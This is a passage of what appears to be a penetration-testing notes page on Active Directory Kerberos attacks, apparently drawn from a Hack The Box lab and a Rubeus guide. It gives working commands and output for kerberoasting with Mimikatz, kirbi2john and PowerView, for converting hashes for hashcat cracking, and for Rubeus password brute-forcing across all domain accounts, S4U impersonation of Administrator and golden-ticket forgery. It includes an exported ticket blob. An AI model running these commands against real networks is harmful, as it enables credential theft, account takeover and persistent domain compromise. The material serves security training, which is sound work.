class="number">25</span> AM ; <span class="number">3</span>/<span class="number">3</span>/<span class="number">2022</span> <span class="number">2</span>:<span class="number">55</span>:<span class="number">25</span> PM</span><br><span class="line">   Server Name: MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">   Client Name: htb<span class="literal">-student</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">   Flags <span class="number">40</span>a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;</span><br><span class="line">====================</span><br><span class="line">Base64 of file : <span class="number">2</span><span class="literal">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local~<span class="number">1433</span><span class="literal">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br><span class="line">====================</span><br><span class="line">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class="line">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span><br><span class="line">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span><br><span class="line">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span><br><span class="line">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span><br><span class="line">xvUkr+<span class="number">5</span>caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span><br><span class="line">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span><br><span class="line">vyd7g9gYH/<span class="number">9</span>aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span><br><span class="line">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span><br><span class="line">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+<span class="number">5</span>q/xNby7smpBpLToi5No</span><br><span class="line">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span><br><span class="line">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span><br><span class="line">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span><br><span class="line">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span><br><span class="line">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/<span class="number">5</span>aQ5Us+T5qM9pmKn5v1</span><br><span class="line">XHou0shzgunaYPfKPCLgjMNZ8+<span class="number">9</span>vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span><br><span class="line">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span><br><span class="line">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span><br><span class="line">ihGjktgVop70jZRX+<span class="number">2</span>x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span><br><span class="line">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span><br><span class="line"><span class="number">0</span>Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span><br><span class="line">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+<span class="number">8</span></span><br><span class="line">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span><br><span class="line">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+<span class="number">1</span>FN56<span class="built_in">h</span></span><br><span class="line">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span><br><span class="line"><span class="number">32</span>UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span><br><span class="line"><span class="number">5</span>oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span><br><span class="line">+jWFIa2EXm0<span class="built_in">H</span>/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span><br><span class="line">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span><br><span class="line">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span><br><span class="line">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span><br><span class="line">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span><br><span class="line">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span><br><span class="line">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   * Saved to file     : <span class="number">2</span><span class="literal">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local~<span class="number">1433</span><span class="literal">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
<p>If we don’t specify the <strong>base64 &#x2F;out:true</strong> command, Mimikatz will extract the tickets and write the to <strong>.kirbi</strong> files. </p>
<p> Next, you prepare the base blob for cracking <code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n</code> then place the above into a file and convert it back to a <strong>.kirbi</strong> file using the base64 utility.<code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></p>
<p> Extract the kerberos ticket using <a target="_blank" rel="noopener" href="http://kirbi2john.py/">kirbi2john.py</a> this will create a file called <strong>crack_file,</strong> which then must be modified to be able to use Hashcat against the hash <code>python2.7 kirbi2john.py sqldev.kirbi</code></p>
<p>Modifying the crack file for hashcat <code>sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code> now you can run the ticket through hashcat and get a clear password.</p>
<h4 id="Skipped-Version"><a href="#Skipped-Version" class="headerlink" title="Skipped Version"></a>Skipped Version</h4><p>So if we decide to skip the base64 output with mimkatz and type <strong>mimikatz # kerberos::list &#x2F;export,</strong> the <strong>.kirbi</strong> file will be written to disk, in this case, you can download the file and run <strong><a target="_blank" rel="noopener" href="http://kirbi2john.py/">kirbi2john.py</a></strong> against them directly, skipping the base64 decoding step.</p>
<h4 id="AUTOMATE-VERSION"><a href="#AUTOMATE-VERSION" class="headerlink" title="AUTOMATE VERSION"></a>AUTOMATE VERSION</h4><p>Using <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">PowerView</a> to extract the TGS ticket and convert them to Hashcat format.</p>
<p><strong>Extracting TGS Ticket</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> sqldev | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat</span><br></pre></td></tr></table></figure>
<p><strong>Target Specific User</strong></p>
<p><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></p>
<p><strong>Exporting All Tickets to a CSV file and viewing the Content</strong></p>
<p><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></p>
<p><code>cat .\ilfreight_tgs.csv</code></p>
<h2 id="REBEUS"><a href="#REBEUS" class="headerlink" title="REBEUS"></a>REBEUS</h2><p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<p>A tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos</p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/">https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</a></p>
<h3 id="Ticket-Operations"><a href="#Ticket-Operations" class="headerlink" title="Ticket Operations"></a><strong>Ticket Operations</strong></h3><p>Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.</p>
<p>In this section, we’ll talk about Rubeus and its capability to play around with tickets.</p>
<h4 id="Asktgt"><a href="#Asktgt" class="headerlink" title="Asktgt"></a>Asktgt</h4><p>Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied</p>
<p><code>rubeus.exe asktgt /user:harshitrajpal /password: Password@1</code></p>
<p> <img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg&#x2F;s16000&#x2F;7.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>As you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.</p>
<p><code>rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g&#x2F;s16000&#x2F;8.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Asktgs</strong></p>
<p>Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.</p>
<p>For example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.</p>
<p><code>rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local</code><br><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg&#x2F;s16000&#x2F;9.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw&#x2F;s16000&#x2F;10.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<h3 id="Klist"><a href="#Klist" class="headerlink" title="Klist"></a>Klist</h3><p>Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w&#x2F;s16000&#x2F;11.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<h3 id="Renew"><a href="#Renew" class="headerlink" title="Renew"></a>Renew</h3><p>The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the &#x2F;dc flag which will be used as a destination for the renewal traffic. We can further use the <strong>tgtdeleg</strong> option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.</p>
<p><strong>&#x2F;ptt</strong> flag can also be used in conjunction to apply the Kerberos</p>
<p><code>rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ&#x2F;s16000&#x2F;12.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>&#x2F;autorenew</strong> sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket</p>
<p><code>rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==</code></p>
<p> <img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw&#x2F;s16000&#x2F;14.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>As you may now observe that after a specified time interval a renewed TGT is shown</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ&#x2F;s16000&#x2F;15.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Brute</strong></p>
<p>The brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. &#x2F;noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,</p>
<p><code>rubeus.exe brute /password:Password@1 /noticket</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA&#x2F;s16000&#x2F;16.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Hash</strong></p>
<p>Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a <strong>hash</strong> function and provide a domain using &#x2F;domain, an account’s name (can be a machine account too) using the&#x2F;user flag and the password using &#x2F;password.</p>
<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA&#x2F;s16000&#x2F;17.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.</p>
<p><strong>S4u</strong></p>
<p>We saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link <strong><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong>. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the <strong>msDS-AllowedToActOnBehalfOfAnotherIdentity</strong> option set in the attribute’s editor. Follow the article <strong><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong> for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.</p>
<ul>
<li><p>&#x2F;rc4: flag is used to provide user noob’s account.</p>
</li>
<li><p>&#x2F;impersonateuser: User that will be impersonated by noob.</p>
</li>
<li><p>&#x2F;msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller</p>
</li>
<li><p>&#x2F;altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.</p>
</li>
<li><p>&#x2F;ptt: Injects the resulting ticket in the current terminal session</p>
</li>
</ul>
<p><code>rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt</code></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw&#x2F;s16000&#x2F;18.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p>This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.</p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A&#x2F;s16000&#x2F;19.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article <strong><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong>.</p>
<p>To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,</p>
<ul>
<li><p>&#x2F;ldap: Retrieves information of user over LDAP protocol</p>
</li>
<li><p>&#x2F;user: Username whose ticket will be forged</p>
</li>
<li><p>&#x2F;printcmd: displays a one liner command that can be used to generate the ticket again that just got generated</p>
</li>
</ul>
<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>
<p><code>rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd</code></p>
